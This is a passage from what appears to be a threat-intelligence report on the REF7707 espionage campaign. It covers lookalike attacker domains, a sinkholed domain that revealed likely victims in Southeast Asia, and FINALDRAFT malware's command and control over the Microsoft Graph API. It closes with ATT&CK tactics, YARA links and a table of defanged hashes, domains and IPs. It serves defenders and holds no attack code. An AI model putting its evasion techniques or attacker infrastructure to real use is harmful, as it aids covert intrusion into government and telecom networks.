<p>While not observed in the REF7707 intrusion, the domain we observed (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ictnsc[.]com</code>) has an <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ict</code> subdomain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ict.ictnsc[.]com</code>), which is strikingly similar to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ict.nsc[.]ru</code>. Again, we cannot confirm if they are related to the legitimate FRC or ITC, it seems the threat actor intended for the domains to be similar, conflated, or confused with each other.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="autodiscovar" class="absolute -top-32"></span>Autodiscovar</h4>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Autodiscovar[.]com</code> has not been directly associated with any FINALDRAFT malware. It has been indirectly associated with REF7707 infrastructure through pivots on web infrastructure identifiers. The parent domain only has a Cloudflare NS record. A subdomain <a href="https://www.virustotal.com/gui/domain/autodiscovar.com/relations">identified through VirusTotal</a> (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cloud.autodiscovar[.]com</code>) points to Cloudflare-owned IP addresses. This domain name resembles other FINALDRAFT and REF7707 web infrastructure and shares the HTTPS service banner hash. This domain was registered on August 26, 2022.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="d-links-and-vm-clouds" class="absolute -top-32"></span>D-links and VM-clouds</h4>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">d-links[.]net</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vm-clouds[.]net</code> were both registered on September 12, 2023, the same day as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hobiter[.]com</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vmphere[.]com</code>. The servers hosting these sites also share the same HTTPS service banner hash. They are not directly associated with the FINALDRAFT malware nor have current routable subdomains, though <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pol.vm-clouds[.]net</code> was previously registered.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="fortineat" class="absolute -top-32"></span>Fortineat</h4>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.fortineat[.]com</code> was hard-coded in the PATHLOADER sample (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dwn.exe</code>). During our analysis of the domain, we discovered that it was not currently registered. To identify any other samples communicating with the domain, our team registered this domain and configured a web server to listen for incoming connections.</p>
<p>We recorded connection attempts over port <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>, where we identified a specific incoming byte pattern. The connections were sourced from eight different telecommunications and Internet infrastructure companies in Southeast Asia, indicating possible victims of the REF7707 intrusion set.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="checkponit" class="absolute -top-32"></span>Checkponit</h4>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">poster.checkponit[.]com</code> was observed in four GUIDLOADER samples and a PATHLOADER sample between May and July 2023, and it was used to host the FINALDRAFT encrypted shellcode. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">checkponit[.]com</code> registration was created on August 26, 2022. There are currently no A records for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">checkponit[.]com</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">poster.checkponit[.]com</code>.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="third-party-infrastructure" class="absolute -top-32"></span>Third-party infrastructure</h4>
<p>Microsoft’s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">graph.microsoft[.]com</code> is used by the FINALDRAFT PE and ELF variants for command and control via the Graph API. This service is ubiquitous and used for critical business processes of enterprises using Office 365. Defenders are highly encouraged to NOT block-list this domain unless business ramifications are understood.</p>
<p>Google’s Firebase service (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">firebasestorage.googleapis[.]com</code>), Pastebin (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pastebin[.]com</code>), and a Southeast Asian University are third-party services used to host the encrypted payload for the loaders (PATHLOADER and GUIDLOADER) to download and decrypt the last stage of FINALDRAFT.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="ref7707-timeline" class="absolute -top-32"></span>REF7707 timeline</h2>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>REF7707 was discovered while investigating an intrusion of a South American nation&#x27;s Foreign Ministry.</p>
<p>The investigation revealed novel malware like FINALDRAFT and its various loaders. These tools were deployed and supported using built-in operating system features that are difficult for traditional anti-malware tools to detect.</p>
<p>FINALDRAFT co-opts Microsoft’s graph API service for command and control to minimize malicious indicators that would be observable to traditional network-based intrusion detection and prevention systems. Third-party hosting platforms for encrypted payload staging also challenge these systems early in the infection chain.</p>
<p>An overview of the VirusTotal submitters and pivots using the indicators in this report shows a relatively heavy geographic presence in Southeast Asia and South America. SIESTAGRAPH, similarly, was the first in-the-wild graph API abuse we had observed, and it (REF2924) involved an attack on a Southeast Asian nation’s Foreign Ministry.</p>
<p>At Elastic Security Labs, we champion defensive capabilities across infosec domains operated by knowledgeable professionals to mitigate advanced threats best.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="ref7707-through-mitre-attck" class="absolute -top-32"></span>REF7707 through MITRE ATT&amp;CK</h2>
<p>Elastic uses the <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.</p>
<ul>
<li><a href="https://attack.mitre.org/tactics/TA0043/">Reconnaissance</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0002">Execution</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0003">Persistence</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0004">Privilege Escalation</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0005">Defense Evasion</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0006">Credential Access</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0007">Discovery</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0008">Lateral Movement</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0009">Collection</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0011">Command and Control</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0010">Exfiltration</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="detecting-ref7707" class="absolute -top-32"></span>Detecting REF7707</h2>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="yara" class="absolute -top-32"></span>YARA</h3>
<ul>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_FinalDraft.yar">FINALDRAFT (Windows)</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Trojan_FinalDraft.yar">FINALDRAFT (Linux)</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Trojan_FinalDraft.yar">FINALDRAFT (Multi-OS)</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PathLoader.yar">PATHLOADER</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_GuidLoader.yar">GUIDLOADER</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="observations" class="absolute -top-32"></span>Observations</h2>
<p>The following observables were discussed in this research.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Observable</th><th>Type</th><th>Name</th><th>Reference</th></tr></thead><tbody><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">39e85de1b1121dc38a33eca97c41dbd9210124162c6d669d28480c833e059530</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Session.x64.dll</code></td><td>FINALDRAFT</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pfman</code></td><td>FINALDRAFT ELF</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">f45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">biosets.rar</code></td><td>FINALDRAFT ELF</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dwn.exe</code></td><td>PATHLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">41a3a518cc8abad677bb2723e05e2f052509a6f33ea75f32bd6603c96b721081</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">5.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">d9fc1cab72d857b1e4852d414862ed8eab1d42960c1fd643985d352c148a6461</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">7.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">f29779049f1fc2d45e43d866a845c45dc9aed6c2d9bbf99a8b1bdacfac2d52f2</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">17b2c6723c11348ab438891bc52d0b29f38fc435c6ba091d4464f9f2a1b926e0</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">3.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">20508edac0ca872b7977d1d2b04425aaa999ecf0b8d362c0400abb58bd686f92</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">33f3a8ef2c5fbd45030385b634e40eaa264acbaeb7be851cbf04b62bbe575e75</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">41141e3bdde2a7aebf329ec546745149144eff584b7fe878da7a2ad8391017b9</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">11.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">49e383ab6d092ba40e12a255e37ba7997f26239f82bebcd28efaa428254d30e1</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">2.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">5e3dbfd543909ff09e343339e4e64f78c874641b4fe9d68367c4d1024fe79249</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">4.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">7cd14d3e564a68434e3b705db41bddeb51dbb7d5425fd901c5ec904dbb7b6af0</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">842d6ddb7b26fdb1656235293ebf77c683608f8f312ed917074b30fbd5e8b43d</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">2.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">f90420847e1f2378ac8c52463038724533a9183f02ce9ad025a6a10fd4327f12</code></td><td>SHA-256</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">6.exe</code></td><td>GUIDLOADER</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">poster.checkponit[.]com</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.fortineat[.]com</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update.hobiter[.]com</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.vmphere[.]com</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cloud.autodiscovar[.]com</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">digert.ictnsc[.]com</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">d-links[.]net</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vm-clouds[.]net</code></td><td>domain-name</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">47.83.8[.]198</code></td><td>ipv4-addr</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.218.153[.]45</code></td><td>ipv4-addr</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45.91.133[.]254</code></td><td>ipv4-addr</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.213.217[.]182</code></td><td>ipv4-addr</td><td></td><td>REF7707 infrastructure</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">47.239.0[.]216</code></td><td>ipv4-addr</td><td></td><td>REF7707 infrastructure</td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="references" class="absolute -top-32"></span>References</h2>
<p>The following were referenced throughout the above research:</p>
<ul>
<li><a href="https://www.elastic.co/security-labs/finaldraft">https://www.elastic.co/security-labs/finaldraft</a></li>
<li><a href="https://mrd0x.com/the-power-of-cdb-debugging-tool/">https://mrd0x.com/the-power-of-cdb-debugging-tool/</a></li>
<li><a href="https://web.archive.org/web/20210305190100/http:/www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html">https://web.archive.org/web/20210305190100/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="about-elastic-security-labs" class="absolute -top-32"></span>About Elastic Security Labs</h2>
<p>Elastic Security Labs is dedicated to creating positive change in the threat landscape by  providing publicly available research on emerging threats.</p>
<p>Follow Elastic Security Labs on X <a href="https://twitter.com/elasticseclabs?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">@elasticseclabs</a> and check out our research at <a href="https://www.elastic.co/security-labs/">www.elastic.co/security-labs/</a>. You can see the technology we leveraged for this research and more by checking out <a href="https://www.elastic.co/security">Elastic Security</a>.</p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/fragile-web-ref7707#ref7707-summarized"><span>REF7707&nbsp;summarized</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/fragile-web-ref7707#key-takeaways"><span>Key&nbsp;takeaways</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/fragile-web-ref7707#campaign-overview-"><span>Campaign Overview&nbsp;</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/fragile-web-ref7707#campaign-layout-the-diamond-model"><span>Campaign layout (the diamond&nbsp;model)</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/fragile-web-ref7707#execution-flow"><span>Execution&nbsp;Flow</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/fragile-web-ref7707#primary-execution-chain"><span>Primary execution&nbsp;chain</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/fragile-web-ref7707#winrshostexe"><span>WinrsHost.exe</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/fragile-web-ref7707#fontdrvhostexe"><span>FontDrvHost.exe</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/fragile-web-ref7707#connectivity-checks"><span>Connectivity&nbsp;checks</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/fragile-web-ref7707#reconnaissance--enumeration--credential-harvesting"><span>Reconnaissance / enumeration / credential&nbsp;harvesting</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=From South America to Southeast Asia: The Fragile Web of REF7707&amp;url=https://www.elastic.co/security-labs/fragile-web-ref7707" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/fragile-web-ref7707" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/fragile-web-ref7707&amp;title=From South America to Southeast Asia: The Fragile Web of REF7707" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/fragile-web-ref7707&amp;title=From South America to Southeast Asia: The Fragile Web of REF7707" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 